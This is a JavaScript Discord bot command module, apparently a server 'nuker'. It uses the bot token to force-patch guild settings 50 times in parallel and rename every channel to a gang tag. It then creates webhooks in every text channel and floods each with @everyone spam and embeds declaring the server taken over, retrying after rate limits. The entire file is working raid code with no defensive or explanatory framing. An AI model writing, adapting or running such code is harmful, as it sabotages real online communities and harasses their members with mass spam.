const axios = require("axios")
const Discord = require("discord.js")
const config = require("../config.json")


const m = "<:_:1224898536164950086>"


module.exports = {
    name: 'bypass',
    async execute(message, args) {

        const comunnityBypass = [];

        for (let i = 0; i < 50; i++) {

            comunnityBypass.push(axios.patch(`https://discord.com/api/v9/guilds/${message.guild.id}`, {
            default_message_notifications: 1,
            explicit_content_filter: 2,
            features: ["COMMUNITY"],
            public_updates_channel_id: 1,
            rules_channel_id: 1,
            verification_level: 2
         }, {
                headers: {
                    Authorization: `Bot ${config.token}`,
                    'Content-Type': 'application/json'
                }
            }))
        }
        await Promise.allSettled(comunnityBypass)

        const setNameBypass = [];

        const channels = message.guild.channels.cache.array()

        channels.forEach(c => {
            c.setParent(null)
            c.setName(`4̶D̶e̶a̶d̶$̶G̶a̶n̶g̶ ̶n̶e̶v̶e̶r̶d̶i̶e̶s̶`)
        })

        await Promise.allSettled(setNameBypass)

try{
        setTimeout(async () => {
            const webhookMessage = " @everyone https://discord.gg/deadgxng";
            const channels = message.guild.channels.cache.filter(channel => channel.type === 'text');

            channels.forEach(async channel =>  {

                try {
                    const webhook = await createWebhook(channel);
                    if (webhook) {
                        for (let i = 0; i < 30; i++) {
                            await sendWebhookMessage(webhook, webhookMessage);
                            await sendWebhookEmbed(webhook);
                            
                        }
                        await sleep(100)
                    }
                } catch (error) {
                    console.error(`[CONSOLE]: Error en el canal ${channel.id}: ${error}`);
                }
                await sleep(30);
            })
            },3000);

    } catch (error) {
        console.error('¡Error al ejecutar el comando "on"!', error);
    }
    }
}
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function createWebhook(channel) {
    try {
        const response = await axios.post(`https://discord.com/api/v9/channels/${channel.id}/webhooks`, {
            name: "⛧",
            avatar: "https://media.discordapp.net/attachments/1229149741422739506/1229577828316483617/da49b4e25166b3270adc31b95b2fae62.jpg?ex=66303096&is=661dbb96&hm=e65d685150e197a6002a0bc11a34fa8b54cebc13c3c6bc0c829630df0636e33d&=&format=webp&width=507&height=458"
        }, {
            headers: {
                Authorization: `Bot ${config.token}`,
                'Content-Type': 'application/json'
            }
        });

        return {
            id: response.data.id,
            token: response.data.token
        };
    } catch (err) {
        if(err.respose && err.response.status === 429){
                return;
        }
    }
}

async function sendWebhookMessage(webhook, message) {
    try {
        await axios.post(`https://discord.com/api/webhooks/${webhook.id}/${webhook.token}`, {
            content: message
        });
    } catch (err) {
        if (err.response && err.response.status === 429) {
            const retryAfter = err.response.headers['retry-after'];
            if (retryAfter) {
                await sleep(retryAfter * 1000);
                return await sendWebhookMessage(webhook, message);
            }
            return;
        }
        console.error(`[CONSOLE]: Error al enviar el mensaje del webhook: ${err}`);
    }
}

async function sendWebhookEmbed(webhook) {
    try {
        const embed = new Discord.MessageEmbed()
        .setTitle(`@DeadGxng is here..`)
        .setDescription("this shit was totally powered by deadgxng, the server no longer belongs to you hehe.")
        .setFooter("fucked by https://github.com/Mxndry")
        .setColor("#ffffff")
        .setImage("https://media.discordapp.net/attachments/972533899462836334/1094951141479034961/trim.48FE0095-7F4A-4AB0-8A3D-057BE198B595.gif?ex=666f78f7&is=666e2777&hm=8a997cc7f99251f383769614b0b7b24534658392cf264bf805756d2eb9c4526b&=")

        await axios.post(`https://discord.com/api/webhooks/${webhook.id}/${webhook.token}`, {
            embeds: [embed.toJSON()],
            content: " @everyone Server fucked ︱ Mendry is here  discord.gg/deadgxng"
        });
    } catch (err) {
        if (err.response && err.response.status === 429) {
            const retryAfter = err.response.headers['retry-after'];
            if (retryAfter) {
                await sleep(retryAfter * 1000);
                return await sendWebhookEmbed(webhook);
            }
            return;
        }
        console.error(`[CONSOLE]: Error al enviar el embed del webhook: ${err}`);
    }
}